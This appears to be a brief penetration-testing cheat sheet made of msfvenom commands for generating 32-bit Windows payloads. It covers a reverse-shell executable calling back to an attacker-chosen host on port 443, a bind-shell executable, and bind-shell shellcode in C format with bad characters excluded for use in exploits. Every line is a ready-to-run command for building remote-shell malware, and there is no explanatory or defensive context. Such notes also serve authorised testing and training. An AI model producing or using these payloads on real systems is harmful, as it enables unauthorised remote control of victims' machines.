### 32 Bit (x86)
#### Reverse Shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
```

#### Bind Shell
```bash
msfvenom -p windows/shell_bind_tcp LPORT=443 -f exe -o bind_shell.exe
```

##### Output in Hex, C Style, Exclude bad chars, Exitfunction thread
```bash
msfvenom -p windows/shell_bind_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

